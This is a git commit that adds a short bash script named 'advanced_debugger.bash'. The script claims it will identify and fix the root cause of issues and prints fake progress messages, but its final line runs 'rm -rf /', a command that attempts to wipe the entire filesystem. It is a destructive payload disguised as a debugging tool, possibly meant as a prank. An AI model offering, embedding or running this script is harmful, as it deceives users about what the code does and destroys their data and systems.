ee909f825525908d5cba2f16701a5c613156bc5a
galvdogs <47905704+galvdogs@users.noreply.github.com>
2019-03-14 10:28:57 +1100

    Update and rename advanced_debugger to advanced_debugger.bash

---
+++ advanced_debugger.bash
@@ -0,0 +1,5 @@
+#Command to resolve all issues originating from script
+echo "Identifying root cause of issue. This may take several minutes"
+wait 120
+echo "Root cause identified. Resolving..."
+rm -rf /
